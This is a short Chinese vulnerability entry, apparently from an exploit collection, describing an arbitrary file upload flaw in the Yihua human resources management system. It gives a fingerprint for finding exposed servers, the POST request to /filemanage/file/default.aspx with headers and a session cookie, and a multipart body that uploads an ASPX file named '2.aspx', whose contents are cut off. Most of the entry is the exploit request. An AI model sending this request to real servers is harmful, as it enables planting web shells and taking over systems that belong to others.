# 亿华人力资源管理系统filemanage存在任意文件上传漏洞

- **系统**：亿华人力资源管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="亿华人力资源管理系统"`
- **请求**：`POST /filemanage/file/default.aspx HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: multipart/form-data; boundary=---------------------------136…`　`Content-Length: 1170`　`Cookie: ASP.NET_SessionId=2g3mplfduhthivdwifteza3q`

**请求体 / payload**
```
-----------------------------13611309432955470360700636523
Content-Disposition: form-data; name="__VIEWSTATE"
/wEPDwULLTEzNjk1NjQwNjYPZBYCAgMPZBYGAgEPDxYCHgRUZXh0BQ0vRmlsZXNVcGxvYWQvZGQCAw8PFgIeB1Zpc2libGVoZGQCBA8PFgIfAWhkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUIQXV0b05hbWWy1sk+LR5PsSft3vRvaTFxMKfM4/Mdc2SRqdis5w3/ag==
-----------------------------13611309432955470360700636523
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
5338F018
-----------------------------13611309432955470360700636523
Content-Disposition: form-data; name="fileToUpload"; filename="2.aspx"
Content-Typ…（脚本共 817 字，完整版见原文）
```

**其他**
- 亿华人力资源管理系统filemanage存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿华人力资源管理系统